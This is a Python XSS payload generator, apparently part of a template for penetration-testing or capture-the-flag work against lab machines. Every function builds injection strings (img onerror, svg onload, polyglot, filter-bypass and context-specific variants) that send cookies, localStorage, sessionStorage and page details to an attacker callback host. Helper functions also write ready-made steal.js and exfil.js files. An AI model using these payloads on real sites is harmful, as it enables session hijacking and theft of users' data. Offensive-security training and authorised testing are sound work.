#!/usr/bin/env python3
"""XSS payload generator for quick POC development"""

from typing import List, Optional
from urllib.parse import quote
from pathlib import Path

from {{cookiecutter.project_slug}}.utils.paths import get_payloads_dir
from {{cookiecutter.project_slug}}.utils.output import out


def cookie_stealer(callback_url: str, b64: bool = True) -> str:
    """Basic cookie stealer using fetch - works with server.py"""
    if b64:
        return f"<script>fetch('{callback_url}/queue?cookie='+btoa(document.cookie))</script>"
    return f"<script>fetch('{callback_url}/queue?cookie='+encodeURIComponent(document.cookie))</script>"


def img_onerror(callback_url: str, steal_cookie: bool = True, b64: bool = True) -> str:
    """XSS via img onerror - works in many contexts
    Note: server.py auto-decodes base64 cookies"""
    if steal_cookie:
        if b64:
            return f'<img src=x onerror="fetch(\'{callback_url}/queue?cookie=\'+btoa(document.cookie))">'
        else:
            return f'<img src=x onerror="fetch(\'{callback_url}/queue?cookie=\'+encodeURIComponent(document.cookie))">'
    return f'<img src=x onerror="fetch(\'{callback_url}/queue?xss=1\')">'


def svg_onload(callback_url: str, steal_cookie: bool = True) -> str:
    """XSS via SVG onload - less commonly filtered"""
    if steal_cookie:
        return f'<svg onload="fetch(\'{callback_url}/queue?cookie=\'+encodeURIComponent(document.cookie))">'
    return f'<svg onload="fetch(\'{callback_url}/queue?xss=1\')">'


def iframe_srcdoc(callback_url: str) -> str:
    """XSS via iframe srcdoc - bypasses some filters"""
    return f'<iframe srcdoc="<script>fetch(\'{callback_url}/queue?cookie=\'+parent.document.cookie)</script>">'


def details_ontoggle(callback_url: str) -> str:
    """XSS via details ontoggle - requires user interaction"""
    return f'<details open ontoggle="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">'


def body_onload(callback_url: str) -> str:
    """XSS via body onload - for HTML injection in body context"""
    return f'<body onload="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">'


def input_onfocus(callback_url: str) -> str:
    """XSS via input autofocus - auto-triggers"""
    return f'<input autofocus onfocus="fetch(\'{callback_url}/queue?cookie=\'+encodeURIComponent(document.cookie))">'


def video_onerror(callback_url: str) -> str:
    """XSS via video onerror - alternative to img"""
    return f'<video src=x onerror="fetch(\'{callback_url}/queue?cookie=\'+encodeURIComponent(document.cookie))">'


def script_src(callback_url: str) -> str:
    """Load external JS from your server"""
    # Assumes you're serving a malicious JS file at /xss.js
    return f'<script src="{callback_url}/xss.js"></script>'


def javascript_uri(callback_url: str) -> str:
    """javascript: URI scheme - for href/action attributes"""
    return f"javascript:fetch('{callback_url}/queue?cookie='+document.cookie)"


def data_uri_script(callback_url: str) -> str:
    """Data URI with base64 encoded script"""
    import base64
    script = f"fetch('{callback_url}/queue?cookie='+document.cookie)"
    b64_script = base64.b64encode(script.encode()).decode()
    return f'<script src="data:text/javascript;base64,{b64_script}"></script>'


def polyglot(callback_url: str) -> str:
    """Polyglot payload that works in multiple contexts"""
    return (f'javascript:/*--></title></style></textarea></script>'
            f'</xmp><svg/onload=\'+/"/+/onmouseover=1/+'
            f'+/[*/[]/+fetch(\'{callback_url}/queue?cookie=\'+document.cookie)//\'>')


def stored_xss_test(callback_url: str) -> str:
    """Simple stored XSS test payload"""
    return f'<script>fetch("{callback_url}/queue?cookie="+encodeURIComponent(document.cookie)+"&stored=1")</script>'


def dom_xss_hash(callback_url: str) -> str:
    """For DOM XSS via location.hash"""
    return f'<script>fetch("{callback_url}/queue?cookie="+encodeURIComponent(document.cookie)+"&hash="+encodeURIComponent(location.hash))</script>'


def blind_xss(callback_url: str, identifier: str = "test") -> str:
    """Blind XSS with more data exfiltration"""
    return ('<script>'
            'fetch("' + callback_url + '/queue?"+'
            '"cookie="+encodeURIComponent(document.cookie)+'
            '"&id=' + identifier + '"+'
            '"&l="+encodeURIComponent(location.href)+'
            '"&r="+encodeURIComponent(document.referrer)+'
            '"&d="+encodeURIComponent(document.domain))'
            '</script>')


def full_exfil(callback_url: str) -> str:
    """Exfiltrate everything useful via POST"""
    return ('<script>'
            'let d={'
            'c:document.cookie,'
            'l:location.href,'
            'r:document.referrer,'
            'd:document.domain,'
            't:document.title,'
            'ls:Object.entries(localStorage),'
            'ss:Object.entries(sessionStorage)'
            '};'
            'fetch("' + callback_url + '",{method:"POST",body:JSON.stringify(d)})'
            '</script>')


def xhr_stealer(callback_url: str) -> str:
    """Use XMLHttpRequest instead of fetch (older browser support)"""
    return (f'<script>'
            f'var x=new XMLHttpRequest();'
            f'x.open("GET","{callback_url}/queue?cookie="+encodeURIComponent(document.cookie));'
            f'x.send();'
            f'</script>')


def generate_all(callback_url: str) -> List[str]:
    """Generate all payload types for testing"""
    return [
        img_onerror(callback_url),
        svg_onload(callback_url),
        cookie_stealer(callback_url),
        input_onfocus(callback_url),
        video_onerror(callback_url),
        iframe_srcdoc(callback_url),
        body_onload(callback_url),
        details_ontoggle(callback_url),
    ]


def filter_bypass_payloads(callback_url: str) -> List[str]:
    """Payloads that might bypass common filters"""
    return [
        # Case variation
        f'<ImG sRc=x OnErRoR="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">',
        # Tab/newline in tag
        f'<img\tsrc=x\tonerror="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">',
        # HTML entities
        f'<img src=x onerror="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">',
        # Double encoding
        f'%253Cimg%20src%3Dx%20onerror%3D%22fetch(%27{callback_url}%2Fqueue%3Fcookie%3D%27%2Bdocument.cookie)%22%253E',
        # Unicode
        f'<img src=x o\u006eerror="fetch(\'{callback_url}/queue?cookie=\'+document.cookie)">',
    ]


def context_specific(callback_url: str, context: str = "html") -> str:
    """Get payload for specific injection context"""
    contexts = {
        "html": img_onerror(callback_url),
        "js_string": '";fetch("' + callback_url + '/queue?cookie="+document.cookie);//',
        "js_var": ';fetch("' + callback_url + '/queue?cookie="+document.cookie);//',
        "attribute": '" onmouseover="fetch(\'' + callback_url + '/queue?cookie=\'+document.cookie)" x="',
        "href": javascript_uri(callback_url),
        "comment": '--><script>fetch("' + callback_url + '/queue?cookie="+document.cookie)</script><!--',
        "css": '</style><script>fetch("' + callback_url + '/queue?cookie="+document.cookie)</script>',
    }
    return contexts.get(context, img_onerror(callback_url))


def quick_test(callback_url: str) -> str:
    """Quick and reliable XSS test - works with server.py"""
    return img_onerror(callback_url, steal_cookie=True, b64=True)


def markdown_xss(callback_url: str) -> str:
    """XSS for markdown contexts"""
    return f'[clickme](javascript:fetch("{callback_url}/queue?cookie="%2Bdocument.cookie))'


def write_payload(filename: str, content: str, subdir: str = "xss") -> str:
    """Write XSS payload to payloads/xss/ directory

    Args:
        filename: Name of file to write
        content: JavaScript/HTML content
        subdir: Subdirectory under payloads/ (default: xss)

    Returns:
        Relative path for serving (e.g., "xss/payload.js")
    """
    payload_dir = get_payloads_dir() / subdir
    payload_dir.mkdir(parents=True, exist_ok=True)

    filepath = payload_dir / filename
    filepath.write_text(content)

    out.info(f"XSS payload written to {filepath}")

    # Return relative path for serving
    return f"{subdir}/{filename}"


def generate_stealer_js(callback_url: str) -> str:
    """Generate and write a cookie stealer JavaScript file

    Creates: payloads/xss/steal.js
    Returns: Relative path for serving
    """
    content = f'''// Auto-generated XSS payload
fetch('{callback_url}/queue?cookie='+btoa(document.cookie)+'&url='+btoa(window.location.href));'''

    return write_payload("steal.js", content)


def generate_full_exfil_js(callback_url: str) -> str:
    """Generate and write a full data exfiltration JavaScript file

    Creates: payloads/xss/exfil.js
    Returns: Relative path for serving
    """
    content = f'''// Full data exfiltration
let data = {
    cookie: document.cookie,
    url: window.location.href,
    referrer: document.referrer,
    domain: document.domain,
    title: document.title,
    localStorage: Object.entries(window.localStorage || {}),
    sessionStorage: Object.entries(window.sessionStorage || {})
};
fetch('{callback_url}', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
});'''

    return write_payload("exfil.js", content)


if __name__ == "__main__":
    # Quick test
    test_url = "http://10.10.14.5:8000"
    print("Quick XSS payloads (work with server.py):")
    print(f"Basic: {quick_test(test_url)}")
    print(f"Cookie: {cookie_stealer(test_url)}")
    print(f"Blind: {blind_xss(test_url, 'admin-panel')}")
    print(f"\nUsage with server_hooks.py:")
    print("1. Start server: python servers/server.py")
    print("2. Send XSS payload to target")
    print("3. In exploit code: cookie = get_cookie(timeout=30)")